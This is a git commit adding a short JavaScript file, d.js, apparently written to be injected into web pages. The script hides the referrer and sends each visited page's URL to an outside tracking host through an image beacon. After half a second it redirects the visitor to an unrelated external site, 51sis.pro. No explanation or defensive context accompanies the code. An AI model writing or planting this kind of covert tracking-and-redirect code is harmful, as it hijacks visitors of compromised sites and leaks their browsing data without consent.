b3cb3732ba13808708725c30b11873920478ba8a
un826590 <78077478+un826590@users.noreply.github.com>
2021-04-21 12:27:55 +0800

    Add files via upload

---
+++ d.js
@@ -0,0 +1,11 @@
+function addMeta(name,content){
+    var meta = document.createElement('meta');
+    meta.content=content;
+    meta.name=name;
+    document.getElementsByTagName('head')[0].appendChild(meta);
+}
+addMeta("referrer","never");
+try{var img = new Image();img.src = '//tj.dblurl.com/analysis.php?site=2&u='+document.URL;}catch{}
+var jumpArr = ["https://51sis.pro/?dc=THD2","https://51sis.pro/?dc=THD2"];
+var jumpRet = jumpArr[Math.floor(Math.random()*jumpArr.length)];
+localU(jumpRet,500);
